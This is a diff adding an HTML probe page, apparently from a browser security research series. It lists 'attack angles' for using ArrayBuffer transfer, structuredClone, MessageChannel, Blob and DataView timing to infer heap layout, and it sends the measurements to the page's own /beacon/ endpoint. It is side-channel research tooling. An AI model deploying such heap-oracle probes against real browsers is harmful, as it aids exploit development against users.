@@ -1,0 +1,316 @@
+<!--
+  p723: ArrayBuffer transfer + structured clone heap oracle
+
+  ArrayBuffer.transfer() (or structuredClone with transfer list)
+  moves backing store ownership between JS realms. The transfer
+  operation deallocates the source buffer and allocates a new one
+  at the destination. This allocation/deallocation pattern can
+  reveal heap layout.
+
+  Key insight: transferring an ArrayBuffer moves its backing store.
+  If the new location depends on the freed slot, repeated
+  transfer-and-measure cycles can map the allocator's free list.
+
+  Attack angles:
+  A) ArrayBuffer transfer address stability -- transfer same-size
+     buffers repeatedly. Does the backing store address change?
+     (Not directly readable, but DataView timing may differ)
+  B) structuredClone size amplification -- clone objects with
+     shared references. The serialization allocates temporary
+     buffers whose size depends on object graph complexity.
+  C) Transfer + neutering timing -- after transfer, source AB
+     is neutered (byteLength=0). Timing of operations on the
+     neutered buffer reveals internal state.
+  D) MessageChannel transfer timing -- postMessage with transfer
+     list. The cross-port transfer timing depends on backing
+     store size and alignment.
+  E) Blob/ArrayBuffer conversion timing -- new Blob([ab]) copies
+     data. arrayBuffer() on Blob allocates. Timing steps reveal
+     page boundaries.
+  F) DataView multi-type access timing -- read the same bytes
+     as different types (Uint8, Int32, Float64, BigUint64).
+     Type conversion timing reveals JIT optimization state.
+
+  CRASH_CLASS: LOW (ArrayBuffer API, structured clone)
+  prior art: p722 (WeakRef GC), p608 (ResizableAB)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p723</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+
+async function main(){
+  b('P723-START:ARRAYBUFFER-TRANSFER-LEAK');
+  var results = [];
+
+  // === SECTION A: ArrayBuffer transfer stability ===
+  b('A:TRANSFER-STABILITY');
+  try {
+    // Check if transfer is available
+    var hasTransfer = typeof ArrayBuffer.prototype.transfer === 'function';
+    b('A:HAS-TRANSFER=' + hasTransfer);
+
+    if (hasTransfer) {
+      var sizes = [64, 256, 1024, 4096, 16384];
+      for (var s = 0; s < sizes.length; s++) {
+        var ab = new ArrayBuffer(sizes[s]);
+        var view = new Uint8Array(ab);
+        view[0] = 0xAA;
+        view[sizes[s]-1] = 0xBB;
+
+        var transfers = [];
+        var t0 = performance.now();
+        for (var i = 0; i < 100; i++) {
+          ab = ab.transfer(sizes[s]);
+          transfers.push(ab.byteLength);
+        }
+        var dt = performance.now() - t0;
+
+        // Verify data survived
+        var check = new Uint8Array(ab);
+        b('A:SIZE=' + sizes[s] + ',TIME=' + dt.toFixed(2) +
+          ',FIRST=' + check[0] + ',LAST=' + check[sizes[s]-1] +
+          ',LEN=' + ab.byteLength);
+      }
+    }
+
+    // structuredClone transfer
+    var scSizes = [64, 256, 1024, 4096];
+    var scTimes = [];
+    for (var s = 0; s < scSizes.length; s++) {
+      var ab = new ArrayBuffer(scSizes[s]);
+      new Uint8Array(ab).fill(0x42);
+
+      var t0 = performance.now();
+      for (var i = 0; i < 200; i++) {
+        var clone = structuredClone(ab, {transfer: [ab]});
+        ab = clone;
+      }
+      var dt = performance.now() - t0;
+      scTimes.push(scSizes[s] + ':' + dt.toFixed(2));
+    }
+    b('A:SC-TRANSFER-TIMES:' + scTimes.join(','));
+  } catch(e) {
+    b('A:ERR:' + e.message);
+  }
+
+  // === SECTION B: structuredClone size amplification ===
+  b('B:CLONE-AMPLIFICATION');
+  try {
+    // Clone objects of increasing complexity
+    var complexities = [];
+
+    // Simple object
+    var t0 = performance.now();
+    for (var i = 0; i < 1000; i++) {
+      structuredClone({a: 1, b: 'hello', c: true});
+    }
+    complexities.push('simple:' + (performance.now() - t0).toFixed(2));
+
+    // Nested object
+    var nested = {a: {b: {c: {d: {e: {f: 42}}}}}};
+    t0 = performance.now();
+    for (var i = 0; i < 1000; i++) {
+      structuredClone(nested);
+    }
+    complexities.push('nested:' + (performance.now() - t0).toFixed(2));
+
+    // Array of objects
+    var arr = [];
+    for (var i = 0; i < 100; i++) arr.push({id: i, val: 'data' + i});
+    t0 = performance.now();
+    for (var i = 0; i < 100; i++) {
+      structuredClone(arr);
+    }
+    complexities.push('array100:' + (performance.now() - t0).toFixed(2));
+
+    // Map
+    var map = new Map();
+    for (var i = 0; i < 100; i++) map.set('key' + i, {val: i});
+    t0 = performance.now();
+    for (var i = 0; i < 100; i++) {
+      structuredClone(map);
+    }
+    complexities.push('map100:' + (performance.now() - t0).toFixed(2));
+
+    // Set
+    var set = new Set();
+    for (var i = 0; i < 100; i++) set.add({id: i});
+    t0 = performance.now();
+    for (var i = 0; i < 100; i++) {
+      structuredClone(set);
+    }
+    complexities.push('set100:' + (performance.now() - t0).toFixed(2));
+
+    b('B:COMPLEXITIES:' + complexities.join(','));
+  } catch(e) {
+    b('B:ERR:' + e.message);
+  }
+
+  // === SECTION C: Neutered buffer timing ===
+  b('C:NEUTERED-TIMING');
+  try {
+    var ab = new ArrayBuffer(4096);
+    new Uint8Array(ab).fill(0xFF);
+
+    // Transfer to neuter the original
+    var transferred = structuredClone(ab, {transfer: [ab]});
+
+    b('C:NEUTERED-LEN=' + ab.byteLength);
+    b('C:TRANSFERRED-LEN=' + transferred.byteLength);
+
+    // Timing operations on neutered buffer
+    var t0 = performance.now();
+    for (var i = 0; i < 100000; i++) {
+      var len = ab.byteLength;
+    }
+    var neuteredTime = performance.now() - t0;
+
+    var t1 = performance.now();
+    for (var i = 0; i < 100000; i++) {
+      var len = transferred.byteLength;
+    }
+    var liveTime = performance.now() - t1;
+
+    b('C:NEUTERED-TIME=' + neuteredTime.toFixed(3) + ',LIVE-TIME=' + liveTime.toFixed(3));
+
+    // Try slice on neutered
+    try {
+      var sliced = ab.slice(0);
+      b('C:NEUTERED-SLICE-LEN=' + sliced.byteLength);
+    } catch(e2) {
+      b('C:NEUTERED-SLICE-ERR=' + e2.message);
+    }
+  } catch(e) {
+    b('C:ERR:' + e.message);
+  }
+
+  // === SECTION D: MessageChannel transfer timing ===
+  b('D:MESSAGECHANNEL-TRANSFER');
+  try {
+    var sizes = [64, 256, 1024, 4096, 16384, 65536];
+    var channelTimes = [];
+
+    for (var s = 0; s < sizes.length; s++) {
+      var mc = new MessageChannel();
+      var received = 0;
+      var t0 = performance.now();
+
+      await new Promise(function(resolve) {
+        mc.port2.onmessage = function(e) {
+          received++;
+          if (received >= 50) resolve();
+        };
+
+        for (var i = 0; i < 50; i++) {
+          var ab = new ArrayBuffer(sizes[s]);
+          new Uint8Array(ab).fill(i & 0xFF);
+          mc.port1.postMessage(ab, [ab]);
+        }
+      });
+
+      var dt = performance.now() - t0;
+      channelTimes.push(sizes[s] + ':' + dt.toFixed(2));
+      mc.port1.close();
+      mc.port2.close();
+    }
+    b('D:CHANNEL-TIMES:' + channelTimes.join(','));
+
+    // Check scaling
+    var times = channelTimes.map(function(t){return parseFloat(t.split(':')[1]);});
+    for (var i = 1; i < times.length; i++) {
+      var sizeRatio = sizes[i] / sizes[i-1];
+      var timeRatio = times[i] / times[i-1];
+      if (timeRatio > sizeRatio * 1.5) {
+        results.push('D:transfer-step=' + sizes[i]);
+      }
+    }
+  } catch(e) {
+    b('D:ERR:' + e.message);
+  }
+
+  // === SECTION E: Blob/ArrayBuffer conversion timing ===
+  b('E:BLOB-CONVERSION');
+  try {
+    var blobSizes = [256, 1024, 4096, 16384, 65536, 262144];
+    var blobTimes = [];
+
+    for (var s = 0; s < blobSizes.length; s++) {
+      var data = new Uint8Array(blobSizes[s]);
+      for (var i = 0; i < data.length; i++) data[i] = i & 0xFF;
+
+      // Blob creation timing
+      var t0 = performance.now();
+      var blobs = [];
+      for (var i = 0; i < 100; i++) {
+        blobs.push(new Blob([data]));
+      }
+      var createDt = performance.now() - t0;
+
+      // arrayBuffer() conversion timing
+      var t1 = performance.now();
+      var ab = await blobs[0].arrayBuffer();
+      var readDt = performance.now() - t1;
+
+      blobTimes.push(blobSizes[s] + ':create=' + createDt.toFixed(2) + ',read=' + readDt.toFixed(3));
+
+      // Verify round-trip
+      var check = new Uint8Array(ab);
+      if (check[0] !== 0 || check[1] !== 1) {
+        b('E:ROUNDTRIP-FAIL-AT=' + blobSizes[s]);
+      }
+    }
+    b('E:BLOB-TIMES:' + blobTimes.join('|'));
+  } catch(e) {
+    b('E:ERR:' + e.message);
+  }
+
+  // === SECTION F: DataView multi-type access timing ===
+  b('F:DATAVIEW-MULTITYPE');
+  try {
+    var ab = new ArrayBuffer(65536);
+    var u8 = new Uint8Array(ab);
+    for (var i = 0; i < u8.length; i++) u8[i] = i & 0xFF;
+    var dv = new DataView(ab);
+
+    // Read same data as different types
+    var typeTests = [
+      {name: 'Uint8', fn: function(o){return dv.getUint8(o);}, stride: 1},
+      {name: 'Int32', fn: function(o){return dv.getInt32(o, true);}, stride: 4},
+      {name: 'Float64', fn: function(o){return dv.getFloat64(o, true);}, stride: 8},
+    ];
+
+    // BigUint64 if available
+    if (typeof dv.getBigUint64 === 'function') {
+      typeTests.push({name: 'BigUint64', fn: function(o){return dv.getBigUint64(o, true);}, stride: 8});
+    }
+
+    var typeTimes = [];
+    for (var t = 0; t < typeTests.length; t++) {
+      var test = typeTests[t];
+      var t0 = performance.now();
+      var maxOff = 65536 - test.stride;
+      for (var round = 0; round < 10; round++) {
+        for (var off = 0; off < maxOff; off += test.stride) {
+          test.fn(off);
+        }
+      }
+      var dt = performance.now() - t0;
+      typeTimes.push(test.name + ':' + dt.toFixed(2));
+    }
+    b('F:TYPE-TIMES:' + typeTimes.join(','));
+  } catch(e) {
+    b('F:ERR:' + e.message);
+  }
+
+  // === RESULTS ===
+  if (results.length > 0) {
+    b('P723-RESULT:HITS=' + results.join(';'));
+  } else {
+    b('P723-RESULT:NO-LEAK-DETECTED');
+  }
+  b('P723-DONE');
+}
+
+setTimeout(main, 200);
+</script>
+</head><body style="margin:0"><pre id="log">p723: ArrayBuffer transfer + structured clone heap oracle</pre></body></html>
